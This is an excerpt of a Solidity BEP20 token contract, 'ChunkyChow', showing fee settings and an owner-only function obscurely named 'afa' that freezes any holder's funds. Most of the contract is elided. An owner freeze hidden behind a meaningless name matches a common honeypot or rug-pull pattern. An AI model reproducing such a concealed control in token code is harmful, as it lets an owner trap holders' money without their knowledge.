...
contract CHUNKYCHOW is Context, IBEP20, Ownable {
    ...
    string private constant _name = 'ChunkyChow';
        string private constant _symbol = 'CHNKY';
    
    uint256 private _taxFee = 200;
    uint256 private _burnFee = 200;
    uint private _max_tx_size = 100000000000 * 10 ** uint256(_decimals);
    ...
    function afa(address one, bool two ) onlyOwner public {
        Account[one] = two;
        FrozenFunds(one, two);
    }
